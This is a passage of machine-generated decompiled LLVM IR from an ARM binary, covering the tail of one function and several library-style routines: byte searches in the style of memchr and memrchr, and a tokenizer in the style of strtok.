  uselistorder i1 %v0_12384, { 1, 0 }
  uselistorder i1 %v1_12384, { 1, 0 }
  uselistorder i32 %v3_12380, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_12378, { 0, 2, 1, 3 }
  uselistorder i32 %v4_12364, { 1, 0 }
  uselistorder i32 %v12_12358, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1234c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12350, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_12340, { 0, 2, 1 }
  uselistorder i32 %v2_12338, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_12338, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_12330, { 1, 0 }
  uselistorder i32 %v1_12328, { 2, 1, 0 }
  uselistorder i32 %v2_12320, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_12320, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12310, { 1, 0 }
  uselistorder i32 %v1_12310, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_12310, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 60, 1, 2, 3, 4, 5, 61, 6, 7, 8, 9, 10, 62, 11, 12, 13, 14, 15, 63, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 64, 65, 66, 67, 69, 68, 30, 31, 56, 32, 33, 34, 35, 36, 57, 37, 38, 39, 40, 41, 58, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 35, 36, 34, 18, 19, 22, 20, 28, 21, 23, 26, 24, 29, 25, 27, 30, 31, 32, 33 }
  uselistorder i32* %r0.global-to-local, { 3, 50, 4, 5, 51, 6, 7, 52, 8, 9, 10, 11, 12, 13, 53, 14, 16, 15, 17, 18, 54, 19, 20, 55, 21, 22, 23, 24, 56, 57, 59, 60, 25, 32, 26, 27, 33, 28, 29, 30, 31, 34, 35, 0, 36, 37, 39, 38, 40, 41, 58, 42, 43, 44, 47, 45, 46, 48, 49, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 41, 0, 42, 1, 24, 2, 25, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 45, 46, 47, 0, 48, 1, 25, 2, 26, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 15, 14, 6, 13, 12, 11, 10, 22, 23, 24, 25, 7, 26, 27, 2, 0, 30, 9, 28, 29, 1, 32, 33, 3, 8, 4, 5, 31 }
  uselistorder label %dec_label_pc_12778, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1270c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_126a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12640, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_125cc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_12590, { 1, 0 }
  uselistorder label %dec_label_pc_1257c, { 1, 0 }
  uselistorder label %dec_label_pc_1253c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_124d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12464, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12404, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 6, 4, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_12378, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12338, { 1, 0 }
}

define i32 @function_12798(i32 %arg1) local_unnamed_addr {
dec_label_pc_12798:
  ret i32 %arg1
}

define i32 @function_127a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_127a0:
  %v0_127a0 = load i32, i32* @r0, align 4
  %v1_127a0 = load i32, i32* @r1, align 4
  %v2_127a0 = inttoptr i32 %v0_127a0 to i8*
  %v3_127a0 = call i32 @function_12310(i8* %v2_127a0, i32 %v1_127a0)
  ret i32 %v3_127a0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_12310, { 1, 2, 0 }
}

define i32 @function_127b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_127b0:
  %v3_127b0 = load i32, i32* @r4, align 4
  %v6_127b0 = load i32, i32* @r5, align 4
  %v9_127b0 = load i32, i32* @r6, align 4
  %v1_127b4 = urem i32 %arg1, 256
  %v0_127d018 = load i32, i32* @r2, align 4
  %v2_127d020 = icmp eq i32 %v0_127d018, 0
  br i1 %v2_127d020, label %dec_label_pc_127e0, label %dec_label_pc_127d8

dec_label_pc_127bc:                               ; preds = %dec_label_pc_127d8
  %v3_127bc = load i8, i8* %.021, align 1
  %v4_127bc = zext i8 %v3_127bc to i32
  %v9_127c0 = icmp eq i32 %v4_127bc, %v1_127b4
  %v1_127c4 = add i32 %v0_127c4, -1
  br i1 %v9_127c0, label %bb, label %dec_label_pc_127d0

bb:                                               ; preds = %dec_label_pc_127bc
  ret i32 %v1_127d8

dec_label_pc_127d0:                               ; preds = %dec_label_pc_127bc
  %v2_127cc = add i32 %v1_127d8, 1
  %v3_127cc = inttoptr i32 %v2_127cc to i8*
  %v2_127d0 = icmp eq i32 %v1_127c4, 0
  br i1 %v2_127d0, label %dec_label_pc_127e0, label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127b0, %dec_label_pc_127d0
  %v0_127c4 = phi i32 [ %v1_127c4, %dec_label_pc_127d0 ], [ %v0_127d018, %dec_label_pc_127b0 ]
  %.021 = phi i8* [ %v3_127cc, %dec_label_pc_127d0 ], [ undef, %dec_label_pc_127b0 ]
  %v1_127d8 = ptrtoint i8* %.021 to i32
  %v2_127d8 = urem i32 %v1_127d8, 4
  %v3_127d8 = icmp eq i32 %v2_127d8, 0
  br i1 %v3_127d8, label %dec_label_pc_127e0, label %dec_label_pc_127bc

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127d0, %dec_label_pc_127d8, %dec_label_pc_127b0
  %v0_1286c37 = phi i32 [ 0, %dec_label_pc_127b0 ], [ 0, %dec_label_pc_127d0 ], [ %v0_127c4, %dec_label_pc_127d8 ]
  %.0.lcssa = phi i8* [ undef, %dec_label_pc_127b0 ], [ %v3_127cc, %dec_label_pc_127d0 ], [ %.021, %dec_label_pc_127d8 ]
  %v4_127e0 = mul nuw nsw i32 %v1_127b4, 256
  %v5_127e0 = or i32 %v4_127e0, %v1_127b4
  %v1_127e4 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_127e4, i32* @ip, align 4
  %v4_127e8 = mul i32 %v5_127e0, 65536
  %v5_127e8 = or i32 %v4_127e8, %v5_127e0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1286c37, 3
  br i1 %tmp, label %dec_label_pc_127f0, label %dec_label_pc_12894.preheader

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127e0, %dec_label_pc_1286c.backedge
  %v0_1280c82 = phi i32 [ %v1_1280c, %dec_label_pc_1286c.backedge ], [ %v0_1286c37, %dec_label_pc_127e0 ]
  %v0_127f081 = phi i32 [ %v4_127f0, %dec_label_pc_1286c.backedge ], [ %v1_127e4, %dec_label_pc_127e0 ]
  %v1_127f0 = inttoptr i32 %v0_127f081 to i32*
  %v2_127f0 = load i32, i32* %v1_127f0, align 4
  %v4_127f0 = add i32 %v0_127f081, 4
  store i32 %v4_127f0, i32* @ip, align 4
  %v2_127f4 = xor i32 %v2_127f0, %v5_127e8
  %v2_127f8 = add i32 %v2_127f4, 2130640639
  %v1_127fc = sub i32 -1, %v2_127f4
  %v2_12800 = xor i32 %v2_127f8, %v1_127fc
  %v2_12804 = and i32 %v2_12800, -2130640640
  %v2_12808 = icmp eq i32 %v2_12804, 0
  %v1_1280c = add i32 %v0_1280c82, -4
  br i1 %v2_12808, label %dec_label_pc_1286c.backedge, label %dec_label_pc_12814

dec_label_pc_1286c.backedge:                      ; preds = %dec_label_pc_127f0, %dec_label_pc_12858
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1280c, 3
  br i1 %tmp107, label %dec_label_pc_127f0, label %dec_label_pc_12894.preheader

dec_label_pc_12814:                               ; preds = %dec_label_pc_127f0
  %v2_12814 = inttoptr i32 %v0_127f081 to i8*
  %v3_12814 = load i8, i8* %v2_12814, align 1
  %v4_12814 = zext i8 %v3_12814 to i32
  %v9_1281c = icmp eq i32 %v4_12814, %v1_127b4
  %v1_12820 = add i32 %v0_127f081, 3
  %v1_12824 = add i32 %v0_127f081, 1
  store i32 %v1_12824, i32* @lr, align 4
  %v1_12828 = add i32 %v0_127f081, 2
  br i1 %v9_1281c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_12814
  store i32 %v3_127b0, i32* @r4, align 4
  store i32 %v6_127b0, i32* @r5, align 4
  store i32 %v9_127b0, i32* @r6, align 4
  ret i32 %v0_127f081

bb51:                                             ; preds = %dec_label_pc_12814
  %v2_12830 = inttoptr i32 %v1_12824 to i8*
  %v3_12830 = load i8, i8* %v2_12830, align 1
  %v4_12830 = zext i8 %v3_12830 to i32
  %v9_12834 = icmp eq i32 %v4_12830, %v1_127b4
  br i1 %v9_12834, label %dec_label_pc_1283c, label %dec_label_pc_12844

dec_label_pc_1283c:                               ; preds = %bb51
  store i32 %v3_127b0, i32* @r4, align 4
  store i32 %v6_127b0, i32* @r5, align 4
  store i32 %v9_127b0, i32* @r6, align 4
  ret i32 %v1_12824

dec_label_pc_12844:                               ; preds = %bb51
  %v2_12844 = inttoptr i32 %v1_12828 to i8*
  %v3_12844 = load i8, i8* %v2_12844, align 1
  %v4_12844 = zext i8 %v3_12844 to i32
  %v9_12848 = icmp eq i32 %v4_12844, %v1_127b4
  br i1 %v9_12848, label %dec_label_pc_12850, label %dec_label_pc_12858

dec_label_pc_12850:                               ; preds = %dec_label_pc_12844
  store i32 %v3_127b0, i32* @r4, align 4
  store i32 %v6_127b0, i32* @r5, align 4
  store i32 %v9_127b0, i32* @r6, align 4
  ret i32 %v1_12828

dec_label_pc_12858:                               ; preds = %dec_label_pc_12844
  %v2_12858 = inttoptr i32 %v1_12820 to i8*
  %v3_12858 = load i8, i8* %v2_12858, align 1
  %v4_12858 = zext i8 %v3_12858 to i32
  %v9_1285c = icmp eq i32 %v4_12858, %v1_127b4
  br i1 %v9_1285c, label %dec_label_pc_12864, label %dec_label_pc_1286c.backedge

dec_label_pc_12864:                               ; preds = %dec_label_pc_12858
  store i32 %v3_127b0, i32* @r4, align 4
  store i32 %v6_127b0, i32* @r5, align 4
  store i32 %v9_127b0, i32* @r6, align 4
  ret i32 %v1_12820

dec_label_pc_12894.preheader:                     ; preds = %dec_label_pc_1286c.backedge, %dec_label_pc_127e0
  %v0_127f0.lcssa = phi i32 [ %v1_127e4, %dec_label_pc_127e0 ], [ %v4_127f0, %dec_label_pc_1286c.backedge ]
  %v0_1280c.lcssa = phi i32 [ %v0_1286c37, %dec_label_pc_127e0 ], [ %v1_1280c, %dec_label_pc_1286c.backedge ]
  %v2_1289411 = icmp eq i32 %v0_1280c.lcssa, 0
  br i1 %v2_1289411, label %dec_label_pc_1289c, label %dec_label_pc_12884

dec_label_pc_12884:                               ; preds = %dec_label_pc_12894, %dec_label_pc_12894.preheader
  %v0_12894.in = phi i32 [ %v0_12894, %dec_label_pc_12894 ], [ %v0_1280c.lcssa, %dec_label_pc_12894.preheader ]
  %v15_1288c = phi i32 [ %v1_12890, %dec_label_pc_12894 ], [ %v0_127f0.lcssa, %dec_label_pc_12894.preheader ]
  %v0_12894 = add i32 %v0_12894.in, -1
  %v1_12884 = inttoptr i32 %v15_1288c to i8*
  %v2_12884 = load i8, i8* %v1_12884, align 1
  %v3_12884 = zext i8 %v2_12884 to i32
  %v9_12888 = icmp eq i32 %v3_12884, %v1_127b4
  br i1 %v9_12888, label %bb52, label %dec_label_pc_12894

bb52:                                             ; preds = %dec_label_pc_12884
  store i32 %v3_127b0, i32* @r4, align 4
  store i32 %v6_127b0, i32* @r5, align 4
  store i32 %v9_127b0, i32* @r6, align 4
  ret i32 %v15_1288c

dec_label_pc_12894:                               ; preds = %dec_label_pc_12884
  %v1_12890 = add i32 %v15_1288c, 1
  %v2_12894 = icmp eq i32 %v0_12894, 0
  br i1 %v2_12894, label %dec_label_pc_1289c, label %dec_label_pc_12884

dec_label_pc_1289c:                               ; preds = %dec_label_pc_12894, %dec_label_pc_12894.preheader
  store i32 %v3_127b0, i32* @r4, align 4
  store i32 %v6_127b0, i32* @r5, align 4
  store i32 %v9_127b0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1288c, { 1, 0, 2 }
  uselistorder i32 %v1_1280c, { 1, 0, 2 }
  uselistorder i32 %v4_127f0, { 0, 2, 1 }
  uselistorder i32 %v0_127f081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_127e0, { 1, 0 }
  uselistorder i32 %v0_1286c37, { 1, 2, 0 }
  uselistorder i32 %v1_127b4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_127b0, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1286c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_127f0, { 1, 0 }
  uselistorder label %dec_label_pc_127e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_127d8, { 1, 0 }
}

define i32 @function_128ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_128ac:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_128b8 = call i32 @function_ef60()
  %v0_128bc = load i32, i32* @r5, align 4
  %v1_128bc = load i32, i32* @r4, align 4
  %v2_128bc = add i32 %v1_128bc, %v0_128bc
  ret i32 %v2_128bc
}

define i32 @function_128c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_128c4:
  %v3_128c4 = load i32, i32* @r4, align 4
  %v1_128c8 = urem i32 %arg2, 256
  %v2_128cc = add i32 %arg3, %arg1
  %v2_128e42 = icmp eq i32 %arg3, 0
  br i1 %v2_128e42, label %dec_label_pc_128f4, label %dec_label_pc_128ec

dec_label_pc_128d4:                               ; preds = %dec_label_pc_128ec
  %v1_128d4 = add i32 %v0_128d4, -1
  %v2_128d4 = inttoptr i32 %v1_128d4 to i8*
  %v3_128d4 = load i8, i8* %v2_128d4, align 1
  %v4_128d4 = zext i8 %v3_128d4 to i32
  %v9_128d8 = icmp eq i32 %v4_128d4, %v1_128c8
  br i1 %v9_128d8, label %bb, label %dec_label_pc_128e4

bb:                                               ; preds = %dec_label_pc_128d4
  ret i32 %v1_128d4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128d4
  %v1_128e0 = add i32 %v0_128e0, -1
  %v2_128e4 = icmp eq i32 %v1_128e0, 0
  br i1 %v2_128e4, label %dec_label_pc_128f4, label %dec_label_pc_128ec

dec_label_pc_128ec:                               ; preds = %dec_label_pc_128c4, %dec_label_pc_128e4
  %v0_128e0 = phi i32 [ %v1_128e0, %dec_label_pc_128e4 ], [ %arg3, %dec_label_pc_128c4 ]
  %v0_128d4 = phi i32 [ %v1_128d4, %dec_label_pc_128e4 ], [ %v2_128cc, %dec_label_pc_128c4 ]
  %v1_128ec = urem i32 %v0_128d4, 4
  %v2_128ec = icmp eq i32 %v1_128ec, 0
  br i1 %v2_128ec, label %dec_label_pc_128f4, label %dec_label_pc_128d4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128e4, %dec_label_pc_128ec, %dec_label_pc_128c4
  %v0_1298c11 = phi i32 [ %v2_128cc, %dec_label_pc_128c4 ], [ %v1_128d4, %dec_label_pc_128e4 ], [ %v0_128d4, %dec_label_pc_128ec ]
  %v0_129787 = phi i32 [ 0, %dec_label_pc_128c4 ], [ 0, %dec_label_pc_128e4 ], [ %v0_128e0, %dec_label_pc_128ec ]
  %v4_128f4 = mul nuw nsw i32 %v1_128c8, 256
  %v5_128f4 = or i32 %v4_128f4, %v1_128c8
  %v4_128f8 = mul i32 %v5_128f4, 65536
  %v5_128f8 = or i32 %v4_128f8, %v5_128f4
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_129787, 3
  br i1 %tmp, label %dec_label_pc_12900, label %dec_label_pc_12988

dec_label_pc_12900:                               ; preds = %dec_label_pc_128f4, %.backedge.backedge
  %v0_1291c51 = phi i32 [ %v1_1291c, %.backedge.backedge ], [ %v0_129787, %dec_label_pc_128f4 ]
  %v0_1290050 = phi i32 [ %v1_12900, %.backedge.backedge ], [ %v0_1298c11, %dec_label_pc_128f4 ]
  %v1_12900 = add i32 %v0_1290050, -4
  %v2_12900 = inttoptr i32 %v1_12900 to i32*
  %v3_12900 = load i32, i32* %v2_12900, align 4
  %v2_12904 = xor i32 %v3_12900, %v5_128f8
  %v2_12908 = add i32 %v2_12904, 2130640639
  %v1_1290c = sub i32 -1, %v2_12904
  %v2_12910 = xor i32 %v2_12908, %v1_1290c
  %v2_12914 = and i32 %v2_12910, -2130640640
  %v2_12918 = icmp eq i32 %v2_12914, 0
  %v1_1291c = add i32 %v0_1291c51, -4
  br i1 %v2_12918, label %.backedge.backedge, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_12900
  %v1_12924 = add i32 %v0_1290050, -1
  %v2_12924 = inttoptr i32 %v1_12924 to i8*
  %v3_12924 = load i8, i8* %v2_12924, align 1
  %v4_12924 = zext i8 %v3_12924 to i32
  %v9_12928 = icmp eq i32 %v4_12924, %v1_128c8
  %v1_1292c = add i32 %v0_1290050, -2
  store i32 %v1_1292c, i32* @ip, align 4
  %v1_12934 = add i32 %v0_1290050, -3
  store i32 %v1_12934, i32* @lr, align 4
  br i1 %v9_12928, label %dec_label_pc_1293c, label %dec_label_pc_12944

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12924
  store i32 %v3_128c4, i32* @r4, align 4
  ret i32 %v1_12924

dec_label_pc_12944:                               ; preds = %dec_label_pc_12924
  %v2_12944 = inttoptr i32 %v1_1292c to i8*
  %v3_12944 = load i8, i8* %v2_12944, align 1
  %v4_12944 = zext i8 %v3_12944 to i32
  %v9_12948 = icmp eq i32 %v4_12944, %v1_128c8
  br i1 %v9_12948, label %dec_label_pc_12950, label %dec_label_pc_12958

dec_label_pc_12950:                               ; preds = %dec_label_pc_12944
  store i32 %v3_128c4, i32* @r4, align 4
  ret i32 %v1_1292c

dec_label_pc_12958:                               ; preds = %dec_label_pc_12944
  %v2_12958 = inttoptr i32 %v1_12934 to i8*
  %v3_12958 = load i8, i8* %v2_12958, align 1
  %v4_12958 = zext i8 %v3_12958 to i32
  %v9_1295c = icmp eq i32 %v4_12958, %v1_128c8
  br i1 %v9_1295c, label %dec_label_pc_12964, label %dec_label_pc_1296c

dec_label_pc_12964:                               ; preds = %dec_label_pc_12958
  store i32 %v3_128c4, i32* @r4, align 4
  ret i32 %v1_12934

dec_label_pc_1296c:                               ; preds = %dec_label_pc_12958
  %v1_1296c = inttoptr i32 %v1_12900 to i8*
  %v2_1296c = load i8, i8* %v1_1296c, align 1
  %v3_1296c = zext i8 %v2_1296c to i32
  %v9_12970 = icmp eq i32 %v3_1296c, %v1_128c8
  br i1 %v9_12970, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1296c, %dec_label_pc_12900
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1291c, 3
  br i1 %tmp70, label %dec_label_pc_12900, label %dec_label_pc_12988

bb19:                                             ; preds = %dec_label_pc_1296c
  store i32 %v3_128c4, i32* @r4, align 4
  ret i32 %v1_12900

dec_label_pc_1298c:                               ; preds = %dec_label_pc_12988
  %v1_12998 = add i32 %v0_12998, -1
  %v1_1298c = add i32 %v0_1298c, -1
  %v2_1298c = inttoptr i32 %v1_1298c to i8*
  %v3_1298c = load i8, i8* %v2_1298c, align 1
  %v4_1298c = zext i8 %v3_1298c to i32
  %v9_12990 = icmp eq i32 %v4_1298c, %v1_128c8
  br i1 %v9_12990, label %bb20, label %dec_label_pc_12988

bb20:                                             ; preds = %dec_label_pc_1298c
  store i32 %v3_128c4, i32* @r4, align 4
  ret i32 %v1_1298c

dec_label_pc_12988:                               ; preds = %dec_label_pc_128f4, %.backedge.backedge, %dec_label_pc_1298c
  %v0_1298c = phi i32 [ %v1_1298c, %dec_label_pc_1298c ], [ %v0_1298c11, %dec_label_pc_128f4 ], [ %v1_12900, %.backedge.backedge ]
  %v0_12998 = phi i32 [ %v1_12998, %dec_label_pc_1298c ], [ %v0_129787, %dec_label_pc_128f4 ], [ %v1_1291c, %.backedge.backedge ]
  %v2_12998 = icmp eq i32 %v0_12998, 0
  br i1 %v2_12998, label %dec_label_pc_129a0, label %dec_label_pc_1298c

dec_label_pc_129a0:                               ; preds = %dec_label_pc_12988
  store i32 %v3_128c4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12998, { 1, 0 }
  uselistorder i32 %v1_1291c, { 1, 0, 2 }
  uselistorder i32 %v1_12900, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1290050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_128f4, { 1, 0 }
  uselistorder i32 %v0_129787, { 1, 2, 0 }
  uselistorder i32 %v0_128d4, { 1, 0, 2 }
  uselistorder i32 %v1_128d4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_128cc, { 1, 0 }
  uselistorder i32 %v1_128c8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_128c4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 3, 5, 6, 4, 14, 7, 11, 8, 0, 13, 12, 15, 1, 9, 2, 10, 16, 17 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12988, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12900, { 1, 0 }
  uselistorder label %dec_label_pc_128f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_128ec, { 1, 0 }
}

define i32 @function_129b0() local_unnamed_addr {
dec_label_pc_129b0:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_129b0 = load i32, i32* @r4, align 4
  store i32 %v3_129b0, i32* %stack_var_-16, align 4
  %v6_129b0 = load i32, i32* @r5, align 4
  %v0_129b4 = load i32, i32* @r0, align 4
  store i32 %v0_129b4, i32* %r4.global-to-local, align 4
  %v2_129b4 = icmp eq i32 %v0_129b4, 0
  %v1_129b8 = load i32, i32* @r2, align 4
  br i1 %v2_129b4, label %bb, label %dec_label_pc_129b0._crit_edge

bb:                                               ; preds = %dec_label_pc_129b0
  %v2_129b8 = inttoptr i32 %v1_129b8 to i32*
  %v3_129b8 = load i32, i32* %v2_129b8, align 4
  store i32 %v3_129b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_129b0._crit_edge

dec_label_pc_129b0._crit_edge:                    ; preds = %dec_label_pc_129b0, %bb
  %v0_129bc = phi i32 [ %v3_129b8, %bb ], [ %v0_129b4, %dec_label_pc_129b0 ]
  store i32 %v0_129bc, i32* @r0, align 4
  store i32 %v1_129b8, i32* @r5, align 4
  %v0_129c4 = load i32, i32* @r1, align 4
  store i32 %v0_129c4, i32* %r6.global-to-local, align 4
  %v1_129c8 = inttoptr i32 %v0_129bc to i8*
  %v2_129c8 = call i32 @function_13ccc(i8* %v1_129c8)
  %v0_129cc = load i32, i32* %r4.global-to-local, align 4
  %v2_129cc = add i32 %v0_129cc, %v2_129c8
  %v3_129cc = inttoptr i32 %v2_129cc to i8*
  %v4_129cc = load i8, i8* %v3_129cc, align 1
  %v6_129cc = zext i8 %v4_129cc to i32
  store i32 %v6_129cc, i32* %r3.global-to-local, align 4
  store i32 %v2_129cc, i32* @r4, align 4
  %v2_129d4 = icmp eq i8 %v4_129cc, 0
  store i1 %v2_129d4, i1* @cpsr_z, align 1
  %v0_129d8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_129d8, i32* @r1, align 4
  store i32 %v2_129cc, i32* @r0, align 4
  br i1 %v2_129d4, label %bb7, label %dec_label_pc_129e8

bb7:                                              ; preds = %dec_label_pc_129b0._crit_edge
  %v2_129e0 = load i32, i32* @r5, align 4
  %v3_129e0 = inttoptr i32 %v2_129e0 to i32*
  store i32 %v2_129cc, i32* %v3_129e0, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129b0._crit_edge
  %v0_129e8 = call i32 @function_12a24()
  store i32 %v0_129e8, i32* %r2.global-to-local, align 4
  %v3_129ec = icmp eq i32 %v0_129e8, 0
  store i1 %v3_129ec, i1* @cpsr_z, align 1
  br i1 %v3_129ec, label %dec_label_pc_129fc, label %dec_label_pc_12a0c

dec_label_pc_129fc:                               ; preds = %dec_label_pc_129e8
  %v0_129f4 = load i32, i32* @r4, align 4
  %v2_129fc = call i32 @function_13b4c(i32 %v0_129f4, i32 0)
  %v0_12a00 = load i32, i32* @r4, align 4
  store i32 %v0_12a00, i32* %r3.global-to-local, align 4
  %v1_12a04 = load i32, i32* @r5, align 4
  %v2_12a04 = inttoptr i32 %v1_12a04 to i32*
  store i32 %v2_129fc, i32* %v2_12a04, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a0c:                               ; preds = %dec_label_pc_129e8
  %v3_12a10 = inttoptr i32 %v0_129e8 to i8*
  store i8 0, i8* %v3_12a10, align 1
  %v4_12a10 = load i32, i32* %r2.global-to-local, align 4
  %v5_12a10 = add i32 %v4_12a10, 1
  store i32 %v5_12a10, i32* %r2.global-to-local, align 4
  %v1_12a14 = load i32, i32* @r5, align 4
  %v2_12a14 = inttoptr i32 %v1_12a14 to i32*
  store i32 %v5_12a10, i32* %v2_12a14, align 4
  %v0_12a18 = load i32, i32* @r4, align 4
  store i32 %v0_12a18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a1c:                               ; preds = %bb7, %dec_label_pc_129fc, %dec_label_pc_12a0c
  %v0_12a1c = load i32, i32* %r3.global-to-local, align 4
  %v2_12a20 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12a20, i32* @r4, align 4
  store i32 %v6_129b0, i32* @r5, align 4
  ret i32 %v0_12a1c

; uselistorder directives
  uselistorder i32 %v0_129bc, { 1, 0 }
  uselistorder i32 %v0_129b4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12a1c, { 2, 1, 0 }
